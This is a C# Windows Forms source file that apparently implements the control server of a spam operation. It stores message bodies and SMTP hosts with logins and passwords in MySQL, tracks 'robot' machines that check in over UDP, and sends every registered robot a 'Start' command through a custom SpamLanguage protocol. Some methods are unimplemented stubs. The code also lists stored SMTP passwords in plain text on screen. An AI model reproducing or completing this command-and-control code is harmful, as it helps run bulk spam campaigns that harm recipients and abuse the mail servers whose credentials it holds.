using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using MySql.Data;
using MySql.Data.MySqlClient;
using ServerApp.Properties;
using System.Reflection;
using System.Data;
using SpamerTypes;

namespace ServerApp {

	public partial class FormServer : Form {

		#region const strings

		public const string selectValidHostnamesQuery =
@"SELECT
	Hostname
FROM
	robots
WHERE
	(Hostname <> '0.0.0.0') AND
	(Hostname <> '255.255.255.255')";

		public const string selectMessagesQuery =
@"SELECT Id,Subject,Body,IsHtml FROM messages";

		public const string selectRobotsQuery =
@"SELECT
	IP,HumanName,SmtpID
FROM
	robots
WHERE
	(IP <> '0.0.0.0') AND
	(IP <> '255.255.255.255')";

		public const string selectSmtpByIdQuery =
@"SELECT
	Host,Port,Login,Password,UseSSL
FROM
	smtpservers
WHERE
	Id = ";

		public const string connectionStrFormat =
			"server={0};user id={1}; password={2}; database={3}; pooling=false";

		#endregion

		UdpClient udpClient;
		MySqlConnection sqlConnection;
		Settings sets = Settings.Default;

		List<Robot> listRobot = null;
		List<Letter> listLetter = null;

		public FormServer() {
			InitializeComponent();

			#region Open UDP client
			try {
				udpClient = new UdpClient(sets.RobotUdpPort);
				udpClient.BeginReceive(Priem, new object());
			}
			catch ( SocketException exc ) {
				MessageBox.Show("Cannot open UDP socket.\r\n" +
					"Port: " + sets.RobotUdpPort.ToString() + "\r\n" +
					exc.Message);
				return;
			}
			#endregion

			OpenSqlConnection();
		}

		#region MySQL access methods

		private void OpenSqlConnection() {
			if ( sqlConnection != null )
				sqlConnection.Close();

			string connectionStr = String.Format(connectionStrFormat,
				sets.DbHost, sets.DbUser, sets.DbPassword, sets.DbName);

			try {
				sqlConnection = new MySqlConnection(connectionStr);
				sqlConnection.Open();
			}
			catch ( MySqlException ex ) {
				MessageBox.Show(ex.Message, "Error connecting to the db server");
				return;
			}
		}

		private bool TryConnection() {
			while ( sqlConnection.State != ConnectionState.Open ) {
				DialogResult dRes;
				dRes = MessageBox.Show(
					"Please, check DB server " +
					"avaliability and settings on `Common` tab." +
					Environment.NewLine + Environment.NewLine +
					"Try to connect again?", "Database connection failed",
					MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);

				if ( dRes == DialogResult.No )
					return false;

				sqlConnection.Dispose();
				OpenSqlConnection();
			}
			return true;
		}

		private IEnumerable<string> GetRobotsHosts() {
			if ( !TryConnection() ) { yield break; }

			MySqlDataReader sqlReader = null;
			MySqlCommand sqlCmd =
				new MySqlCommand(selectValidHostnamesQuery, sqlConnection);

			sqlReader = sqlCmd.ExecuteReader();

			while ( sqlReader.Read() )
				yield return sqlReader.GetString(0);
			if ( sqlReader != null )
				sqlReader.Close();
		}

		private void PopulateMessages() {
			if ( !TryConnection() )
				return;

			MySqlDataReader sqlReader = null;
			MySqlCommand sqlCmd =
			new MySqlCommand(selectMessagesQuery, sqlConnection);

			try {
				sqlReader = sqlCmd.ExecuteReader();

				Letter letter;
				listLetter = new List<Letter>();
				while ( sqlReader.Read() ) {
					letter.Id = sqlReader.GetInt32(0);
					letter.Subject = sqlReader.GetString(1);
					letter.Body = sqlReader.GetString(2);
					letter.IsHtml = sqlReader.GetBoolean(3) ? 1 : 0;
					listLetter.Add(letter);
				}
			}
			catch ( MySqlException ex ) {
				MessageBox.Show("Failed to populate messages list: " + ex.Message);
			}
			finally {
				if ( sqlReader != null )
					sqlReader.Close();
			}
			FillListMessages();
		}

		private void PopulateRobots() {
			if ( !TryConnection() ) {
				//listBoxRobots.Enabled = false;
				return;
			}

			MySqlCommand sqlCmd =
				new MySqlCommand(selectRobotsQuery, sqlConnection);
			MySqlDataReader sqlReader = sqlCmd.ExecuteReader();

			Robot robot = new Robot();
			listRobot = new List<Robot>();
			while ( sqlReader.Read() ) {
				// IP, HumanName, SmtpID
				robot.IP = sqlReader.GetString(0);
				robot.Name = sqlReader.GetString(1);
				robot.SmtpId = sqlReader.GetInt32(2);
				listRobot.Add(robot);
			}

			sqlReader.Close();

			for ( int i = 0; i < listRobot.Count; i++ ) {
				Robot tmpRobot = listRobot[i];
				tmpRobot.SmtpServer =
					GetSmtpServerById(tmpRobot.SmtpId);
				listRobot[i] = tmpRobot;
			}

			FillListRobots();
		}

		private void PopulateEmails() {
			//throw new Exception("The method or operation is not implemented.");
		}

		private AuthServerInfo GetSmtpServerById(int id) {
			AuthServerInfo servInf = new AuthServerInfo();
			MySqlCommand sqlCmd = new MySqlCommand(selectSmtpByIdQuery + id.ToString(),
				sqlConnection);
			MySqlDataReader sqlReader = sqlCmd.ExecuteReader();
			if ( sqlReader.Read() ) {
				// Host Port login Password UseSSL
				servInf.Host = sqlReader.GetString(0);
				servInf.Port = sqlReader.GetInt32(1);
				servInf.Username = sqlReader.GetString(2);
				servInf.Password = sqlReader.GetString(3);
				servInf.UseSSL = sqlReader.GetInt16(4) == 1 ? true : false;
			}
			sqlReader.Close();
			return servInf;
		}

		#endregion

		#region UDP Interface

		void Priem(IAsyncResult iar) {
			IPEndPoint remoteIPEndPoint = null;

			byte[] bytes = udpClient.EndReceive(iar, ref remoteIPEndPoint);

			SpamLanguage verb = (SpamLanguage)bytes[0];

			switch ( verb ) {
			case SpamLanguage.KnockKnock:
				AddRobot(remoteIPEndPoint.Address.ToString());
				break;
			default:
				MessageBox.Show("Incorrect command received");
				break;
			}

			udpClient.BeginReceive(Priem, iar);
		}

		private void AddRobot(string p) {
			throw new Exception("The method or operation is not implemented.");
		}

		private void Say(string Host, int Port, SpamLanguage cmd) {
			byte[] dgrm = new byte[] { (byte)cmd };

			UdpClient uclient = new UdpClient(Host, Port);
			uclient.Send(dgrm, dgrm.Length);
			uclient.Close();
		}

		#endregion

		private void SendStartToAll() {
			int roborPort = sets.RobotUdpPort;

			foreach ( string robotHost in GetRobotsHosts() ) {
				try {
					Say(robotHost, roborPort, SpamLanguage.Start);
				}
				catch ( Exception exc ) {
					MessageBox.Show(exc.Message);
					continue;
				}
			}
		}

		private void FillListMessages() {
			listBoxMessages.Items.Clear();
			foreach ( Letter letter in listLetter ) {
				string item = "";
				item += "#" + letter.Id.ToString()
					+ " ";
				item += letter.Subject == null ? "<no subject>" :
					"'" + letter.Subject + "'";
				item += ", as ";
				item += letter.IsHtml == 1 ? "HTML" : "text";

				listBoxMessages.Items.Add(item);
			}
		}

		private void FillListRobots() {
			listBoxRobots.Items.Clear();

			if ( listRobot == null ) {
				listBoxRobots.Items.Add("<no robots in database>");
				return;
			}

			foreach ( Robot robot in listRobot ) {
				string item = "";
				item += robot.IP + " \"";
				item += robot.Name + "\"; SMTP: ";
				item += robot.SmtpServer.Host + ":";
				item += robot.SmtpServer.Port.ToString() + ", ";
				item += robot.SmtpServer.Username + ":";
				item += robot.SmtpServer.Password + ", ";
				item += robot.SmtpServer.UseSSL ? "using SSL" : "not using SSL";

				listBoxRobots.Items.Add(item);
			}
		}

		#region Events handlers

		private void FormServer_Load(object sender, EventArgs e) {
			tabControl.SelectedTab = tabControl.TabPages["tabMessages"];
			PopulateMessages();
		}

		private void optionsToolStripMenuItem_Click(object sender, EventArgs e) {
			FormOptions fOpts = new FormOptions();
			fOpts.Show();
		}

		private void tabControl1_SelectedIndexChanged(object sender, EventArgs e) {
			switch ( tabControl.SelectedIndex ) {
			case 0: // emails
				PopulateEmails();
				break;
			case 1: // messages
				PopulateMessages();
				break;
			case 2: // robots
				PopulateRobots();
				break;
			case 3: // common
				//PopulateMessages();
				break;
			default:
				break;
			}
		}

		private void buttonSend_Click(object sender, EventArgs e) {
			SendStartToAll();
		}

		#endregion


	}
}